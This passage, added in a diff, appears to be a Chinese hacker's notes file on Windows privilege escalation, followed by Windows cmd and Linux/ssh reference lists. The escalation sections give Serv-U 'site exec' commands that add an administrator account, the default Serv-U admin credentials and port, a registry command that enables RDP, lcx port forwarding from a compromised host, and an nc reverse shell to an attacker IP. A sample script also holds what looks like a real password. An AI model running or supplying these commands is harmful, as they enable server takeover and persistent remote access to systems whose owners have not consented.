+			对策：有的管理员安装Serv-u都是使用默认目录C:\Program Files\Serv-U安装，这个目录虽然不能写，也不能修改，但是默认iusr是可以读的，我们可以用webshell来下载ServUDaemon.exe，用Ultraedit打开分析一下，获取Serv-U的帐号密码，修改Exp编译上传运行。
+			
+			终极防御：
+				a.设置好目录权限，不要疏忽大意；
+				b.Serv-U最好不要使用默认安装路径，设置Serv-U目录的权限，只有管理员才能访问；
+				c.用我介绍的办法修改Serv-U的默认管理员名字和密码，喜欢的话端口也可以改掉。
+	}
+	2.FTP命令行提权
+	{
+		cmd
+		ftp
+		open 192.168.1.100 60000
+		quote site exec net user username password /add 回车
+		quote site exec net localgroup administrators username /add 回车
+	}
+	3.大马提权
+	{
+			用户名:	LocalAdministrator
+			口 令：	#l@$ak#.lk;0@P
+			端 口：	43958
+			系统路径： 	c:
+			命　令： cmd /c net user username password /add & net localgroup administrators username /add
+	}
+	3.G6-FTP提权
+	{
+		
+	}
+	4.FileZilla提权
+	{
+		
+	}
+	5.FlashFXP提权
+	{
+		
+	}
+	6.PcAnywhere提权
+	{
+		
+	}
+	7.Xlight FTP Server提权
+	{
+		
+	}
+}
+（三）服务器管理软件提权
+{
+	远程软件提权
+	vnc
+	teamviewer
+	radmin
+	Magic Winmail提权
+
+	navicat提权
+	zend
+	搜狗输入法提权
+	利用360提权
+}
+提权辅助
+{
+	开3389.exe
+		REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  
+		3389.bat
+	端口转发：内网环境
+	{
+		lcx.exe 
+		{
+			具体使用方法：
+			本地 lcx -listen 51 33891  //监听本地51端口，将51端口流量转发到33891端口
+			肉鸡 lcx -slave 本机ip 51 肉鸡 3389 //将本地3389端口流量转发本机ip的51端口
+		}
+		nc.exe
+		{
+			nc在本地监听1340端口，nc -l -p 1340
+			在cmd下执行 quote site exec "c:\nc.exe -e cmd.exe *.*.*.* 1340"
+			net user
+			cacls c:\windows\system32\net.exe查看下net的权限设置
+		}
+	}
+	DLL劫持
+}
+}
+
+CMD命令详解	
+{
+常用CMD
+sc命令
+	sc是用于与服务控制管理器和服务进行通信的命令行程序
+	语法是：
+		sc config 服务名 start= demand     //手动
+		sc condig 服务名 start= auto       //自动
+		sc config 服务名 start= disabled //禁用
+		sc start 服务名
+		sc stop 服务名
+		
+Net start/stop 命令详解
+
+	功能：启动服务，或显示已启动服务的列表。两个或多个词组成的服务名，例如 Net Logon 或 Computer Browser，必须两边加引号。
+	格式：net start [service]
+	键入不带参数的 net start 显示正在运行服务的列表。
+
+	service：
+		包括 alerter、client service for netware、clipbook server、content index、computer browser、dhcp client、directory replicator、eventlog、ftp publishing service、
+			hypermedia object manager、logical disk manager、lpdsvc、media services management, messenger、Fax Service、Microsoft install server、net logon、network dde、network dde dsdm、nt lm security support provider、ole、plug and play、remote access connection manager、remote access isnsap service、remote access server、remote procedure call (rpc) locator、remote procedure call (rpc) service、schedule、server、simple tcp/ip services、site server ldap service、smartcard resource manager、snmp、spooler、task scheduler、tcp/ip netbios helper、telephony service、tracking service、tracking (server) service、ups、Windows time service 和workstation。
+		下面服务只有在 Windows 2000 上可用：file service for macintosh、gateway service for netware、microsoft dhcp service、print service for macintosh、windows internet name service。
+	服务说明
+		Net start Alerter
+		启动“警报器”服务。“警报器”服务发送警告消息。
+		Net start Alerter
+		Net start Client Service for NetWare
+		启动“NetWare 客户服务”。该命令只有在安装了 NetWare 客户服务的情况下才能在 Wind
+		ows 2000 Professional 上使用。
+		net start "client service for netware"
+		Net start ClipBook Server
+		启动“剪贴簿服务器”服务。两个单词组成的服务名，例如 ClipBook Server，必须两边加
+		引号 ("。
+		net start "clipbook server"
+
+		Net start Computer Browser
+		启动“计算机浏览器”服务。
+		net start "computer browser"
+
+		Net start DHCP Client
+		启动“DHCP 客户”服务。该命令只有在安装了 TCP/IP 协议之后才可用。
+		net start "dhcp client"
+
+		Net start Directory Replicator
+		启动“目录复制程序”服务。“目录复制程序”服务将指定的文件复制到指定服务器上。两
+		个词组成的服务名，例如 Directory Replicator，必须两边加引号 ("。也可以用命令 net
+		start replicator 启动该服务。
+		net start "directory replicator"
+
+		Net start Eventlog
+		启动“事件日志”服务，该服务将事件记录在本地计算机上。必须在使用事件查看器查看记
+		录的事件之前启动该服务。
+		net start Eventlog
+
+		Net start File Server for Macintosh
+		启动 Macintosh 文件服务，允许 Macintosh 计算机使用共享文件。该命令只能在运行 Win
+		dows 2000 Server 的计算机上可用。
+		net start "file service for macintosh"
+		Net start FTP Publishing Service
+		启动 FTP 发布服务。该命令只有在安装了 Internet 信息服务后才可用。
+		net start "ftp publishing service"
+		Net start Gateway Service for NetWare
+		启动 NetWare 网关服务。该命令只有在安装了 NetWare 网关服务的情况下才能在 Windows
+		2000 Server 上可用。
+		net start "gateway service for netware"
+		Net start Lpdsvc
+		启动 TCP/IP 打印服务器服务。该命令只有在 UNIX 打印服务和 TCP/IP 协议安装后方可使
+		用。
+		net start lpdsvc
+
+		Net start Messenger
+		启动“信使”服务。“信使”?裨市砑扑慊?邮沼始??
+		net start messenger
+
+		Net start Microsoft DHCP Service
+		启动 Microsoft DHCP 服务。该命令只有在运行 Windows 2000 Server 并且已安装 TCP/IP
+		协议和 DHCP 服务的情况下才可用。
+		net start "microsoft dhcp service"
+
+		Net start Net Logon
+		启动“网络登录”服务。“网络登录”服务验证登录请求并控制复制用户帐户数据库域宽。
+		两个词组成的服务名，例如 Net Logon，必须两边加引号 ("。该服务也可以使用命令 net
+		start netlogon 启动。
+		net start "net logon"
+
+		Net start Network DDE
+		启动“网络 DDE”服务。
+		net start "network dde"
+		Net start NT LM Security Support Provider
+		启动“NT LM 安全支持提供程序”服务。该命令只有在安装了“NT LM 安全支持提供程序”
+		后才可用。
+		net start "nt lm security support provider"
+		Net start OLE
+		启动对象链接和嵌入服务。
+		net start ole
+		Net start Print Server for Macintosh
+		启动 Macintosh 打印服务器服务，允许从 Macintosh 计算机打印。该命令只能在运行 Win
+		dows 2000 Server 的计算机上可用。
+		net start "print server for macintosh"
+		Net start Remote Access Connection Manager
+		启动“远程访问连接管理器”服务。该命令只有在安装了“远程访问服务”后才可用。
+		net start "remote access connection manager"
+		Net start Remote Access ISNSAP Service
+		启动“远程访问 ISNSAP 服务”。该命令只有在安装了“远程访问服务”后才可用。
+		net start "remote access isnsap service"
+		Net start Remote Procedure Call (RPC) Locator
+		启动 RPC 定位器服务。“定位器”服务是 Microsoft Windows 2000 的 RPC 名称服务。
+		net start "remote procedure call (rpc) locator"
+
+		Net start Remote Procedure Call (RPC) Service
+		启动“远程过程调用 (RPC) 服务”。“远程过程调用 (RPC) 服务”是 Microsoft Windows
+		2000 的 RPC 子系统。RPC 子系统包括终结点映射器和其他各种 RPC 服务。
+		net start "remote procedure call (rpc) service"
+
+		Net start Schedule
+		启动“计划”服务。“计划”服务使计算机可以使用 at 命令在指定时间启动程序。
+		net start schedule
+
+		Net start Server
+		启动“服务器”服务。“服务器”服务使计算机可以共享网络上的资源。
+		net start server
+
+		Net start Simple TCP/IP Services
+		启动“简单 TCP/IP 服务”服务。该命令只有在安装了 TCP/IP 和“简单 TCP/IP 服务”后
+		才可以使用。
+		net start "simple tcp/ip services"
+		Net start Site Server LDAP Service
+		启动“Site Server LDAP 服务”。“Site Server LDAP 服务”在 Windows 2000 Active D
+
+		irectory 中发布 IP 多播会议。该命令只有在安装了“Site Server LDAP 服务”后才可以使
+		用。
+		net start "site server ldap service"
+
+		Net start SNMP
+		启动 SNMP 服务。SNMP 服务允许服务器向 TCP/IP 网络上的 SNMP 管理系统报告当前状态。
+		该命令只有在安装了 TCP/IP 和 SNMP 后才可以使用。
+		net start snmp
+
+		Net start Spooler
+		启动“后台打印程序”。
+		net start spooler
+		Net start TCP/IP NetBIOS Helper
+		在 TCP 服务上启用 Netbios 支持。该命令只有在安装了 TCP/IP 才可用。
+		net start "tcp/ip netbios helper"
+		Net start UPS
+		启动“不间断电源 (UPS)”服务
+		net start ups
+
+		Net start Windows Internet Name Service
+		启动“Windows Internet 命名服务”。该命令只有在安装了 TCP/IP 和“Windows Interne
+		t 命名服务”后在 Windows 2000 Servers 上才可以使用。
+		net start "windows internet name service"
+
+		Net start Workstation
+		启动“工作站”服务。“工作站”服务使计算机可以连接并使用网络资源。
+		net start workstation
+		Net start Schedule
+		有的地方称为“定时”服务，叫法不同，请大家注意了，其实是一回事！
+		Net start Telnet
+		启动telnet服务，打开23端口，有的情况下需先运行NTLM.exe。为什么？到榕G的说明里去找吧！ 	
+		
+cmd命令大全（系统信息搜集）
+　　winver---------检查Windows版本
+　　wmimgmt.msc----打开windows管理体系结构(WMI)
+　　wupdmgr--------windows更新程序
+　　wscript--------windows脚本宿主设置
+　　write----------写字板
+　　winmsd---------系统信息
+　　wiaacmgr-------扫描仪和照相机向导
+　　winchat--------XP自带局域网聊天
+cmd命令大全（系统功能）
+　　mem.exe--------显示内存使用情况
+　　Msconfig.exe---系统配置实用程序
+　　mplayer2-------简易widnows media player
+　　mspaint--------画图板
+　　mstsc----------远程桌面连接
+　　mplayer2-------媒体播放机
+　　magnify--------放大镜实用程序
+　　mmc------------打开控制台
+　　mobsync--------同步命令
+cmd命令大全（设备管理）
+　　dxdiag---------检查DirectX信息
+　　drwtsn32------ 系统医生
+　　devmgmt.msc--- 设备管理器
+　　dfrg.msc-------磁盘碎片整理程序
+　　diskmgmt.msc---磁盘管理实用程序
+　　dcomcnfg-------打开系统组件服务
+　　ddeshare-------打开DDE共享设置
+　　dvdplay--------DVD播放器
+cmd命令大全（网络管理）
+　　net stop messenger-----停止信使服务
+　　net start messenger----开始信使服务
+　　notepad--------打开记事本
+　　nslookup-------网络管理的工具向导
+　　ntbackup-------系统备份和还原
+　　narrator-------屏幕“讲述人”
+　　ntmsmgr.msc----移动存储管理器
+　　ntmsoprq.msc---移动存储管理员操作请求
+　　netstat -an----(TC)命令检查接口
+cmd命令大全（文件管理）
+　　syncapp--------创建一个公文包
+　　sysedit--------系统配置编辑器
+　　sigverif-------文件签名验证程序
+　　sndrec32-------录音机
+　　shrpubw--------创建共享文件夹
+　　secpol.m转载自电脑十万个为什么http://www.qq880.com，请保留此标记sc-----本地安全策略
+　　syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码
+　　services.msc---本地服务设置
+　　Sndvol32-------音量控制程序
+　　sfc.exe--------系统文件检查器
+　　sfc /scannow---windows文件保护
+cmd命令大全（任务管理）
+　　tsshutdn-------60秒倒计时关机命令
+　　tourstart------xp简介（安装完成后出现的漫游xp程序）
+　　taskmgr--------任务管理器
+　　eventvwr-------事件查看器
+　　eudcedit-------造字程序
+　　explorer-------打开资源管理器
+　　packager-------对象包装程序
+　　perfmon.msc----计算机性能监测程序
+　　progman--------程序管理器
+　　regedit.exe----注册表
+　　rsop.msc-------组策略结果集
+　　regedt32-------注册表编辑器
+　　rononce -p ----15秒关机
+　　regsvr32 /u *.dll----停止dll文件运行
+　　regsvr32 /u zipfldr.dll------取消ZIP支持
+cmd命令大全（程序管理）
+　　cmd.exe--------CMD命令提示符
+　　chkdsk.exe-----Chkdsk磁盘检查
+　　certmgr.msc----证书管理实用程序
+　　calc-----------启动计算器
+　　charmap--------启动字符映射表
+　　cliconfg-------SQL SERVER 客户端网络实用程序
+　　Clipbrd--------剪贴板查看器
+　　conf-----------启动netmeeting
+　　compmgmt.msc---计算机管理
+　　cleanmgr-------垃圾整理
+　　ciadv.msc------索引服务程序
+　　osk------------打开屏幕键盘
+　　odbcad32-------ODBC数据源管理器
+　　oobe/msoobe /a----检查XP是否激活
+　　lusrmgr.msc----本机用户和组
+　　logoff---------注销命令
+　　iexpress-------木马捆绑工具，系统自带
+　　Nslookup-------IP地址侦测器
+　　fsmgmt.msc-----共享文件夹管理器
+　　utilman--------辅助工具管理器
+　　gpedit.msc-----组策略
+	at------------查看当前任务
+}
+}
+}
+
+
+
+Linux提权（exp反弹shell提权）
+{
+{
+思路
+操作
+Linux提权常用命令
+id
+uname -a
+chmod -R 777 file
+gcc -o exp exp.c
+pwd
+tar
+
+
+ssh命令
+{
+1.ssh命令用于远程登录上Linux主机。
+SSH（全称 Secure Shell)是一种加密的网络协议。
+使用该协议的数据将被加密，如果在传输中间数据泄漏，也可以确保没有人能读取出有用信息。
+要使用 SSH，目标机器应该安装 SSH 服务端应用程序，因为 SSH 是基于客户-服务模式的。 
+当你想安全的远程连接到主机，可中间的网络（比如因特网）并不安全，通常这种情况下就会使用 SSH。
+22
+1.安装 SSH
+
+如果碰巧你的机器没装，我们可以手工来安装一下。最简单的方式就是使用 Linux 包管理器。
+
+基于 Debian / Ubuntu 的系统 :
+安装 ssh-client
+$ sudo apt-get install openssh-client
+安装 ssh-server
+$ sudo apt-get install openssh-server
+
+基于 RedHat / CentOS 的系统 :
+# yum install openssh-server openssh-clients
+SSH 一旦安装上，我们就可以在终端下输入 ssh 来检查下安装的是否正常。
+
+
+2.常用命令格式：ssh [-l login_name] [-p port] [user@]hostname，更详细的可以用ssh -h查看。
+举例
+
+	不指定用户：
+
+		ssh 192.168.0.11
+
+	指定用户：
+
+		ssh -l root 192.168.0.11
+
+		ssh root@192.168.0.11
+
+
+	如果修改过ssh登录端口的可以：
+
+		ssh -p 12333 192.168.0.11
+
+		ssh -l root -p 12333 216.230.230.114
+
+		ssh -p 12333 root@216.230.230.114
+
+4.修改配置文件/etc/ssh/sshd_config，可以改ssh登录端口和禁止root登录。改端口可以防止被端口扫描。
+
+	编辑配置文件：
+
+		vim /etc/ssh/sshd_config
+
+	找到#Port 22，去掉注释，修改成一个五位的端口：
+
+		Port 12333
+
+	找到#PermitRootLogin yes，去掉注释，修改为：
+
+		PermitRootLogin no
+
+	重启sshd服务：
+
+		service sshd restart
+		
+5.SSH常用参数选项:
+{
+	-1：强制使用ssh协议版本1； 
+	-2：强制使用ssh协议版本2； 
+	-4：强制使用IPv4地址； 
+	-6：强制使用IPv6地址； 
+	-A：开启认证代理连接转发功能； 
+	-a：关闭认证代理连接转发功能； 
+	-b：使用本机指定地址作为对应连接的源ip地址； 
+	-C：请求压缩所有数据； 
+	-F：指定ssh指令的配置文件； 
+	-f：后台执行ssh指令； 
+	-g：允许远程主机连接主机的转发端口； 
+	-i：指定身份文件； 
+	-l：指定连接远程服务器登录用户名； 
+	-N：不执行远程指令； 
+	-o：指定配置选项； 
+	-p：指定远程服务器上的端口； 
+	-q：静默模式； 
+	-X：开启X11转发功能； 
+	-x：关闭X11转发功能； 
+	-y：开启信任X11转发功能。
+}
+
+}
+}
+
+linux连接远程桌面
+{
+	sudo apt-get install xrdp
+	telnet 192.168.1.123
+	rdesktop -u username -p password  IP  -r sound:on/off -g 1024*768
+	说明：
+		1、username和password分别是目标电脑的帐号和密码；
+
+		2、IP为目标电脑的IP地址（可能需要先连接VPN）；
+
+		3、sound：on表示传送目标电脑的声音，off则为关闭；
+
+		4、-g后接想要显示的分辨率，使用 -g workarea 可自适应铺满当前linux窗口大小
+
+		以上，除了用户名、密码和IP必须输入，其他参数都可以缺省。
+
+		更多参数：
+
+		5、使用 -f 参数进入全屏模式，中途可使用Ctrl+Alt+Enter组合键退出全屏（不知道的就郁闷了）;
+
+		6、-r disk:share_name=/local-disk 将本地磁盘映射到远程电脑，其中share_name为显示名称，可自定义，local-disk表示本地linux的一个目录，比如 /data。
+		7、-r clipboard:PRIMARYCLIPBOARD 允许在远程主机和本机之间共享剪切板，就是可以复制粘贴。
+		以上是rdesktop的常用参数，更多参数请自行百度或者在linux中执行 rdesktop --help查看。
+	
+	脚本
+		#!/bin/bash
+		rdesktop -u zhangge -p zhangge918 192.168.10.104 -r sound:off -g 1280*800
+		exit
+	
+}
+linux常用命令
+{
+	apt-get install
+	apt-get update
+	apt-get upgrade
+	passwd user
+	cp
+	chmod 777 /var/www/html/regist -R
+	sudo service apache2 start
+	tar xvf a.tar.gz
+	ifconfig
+	
+}
+}
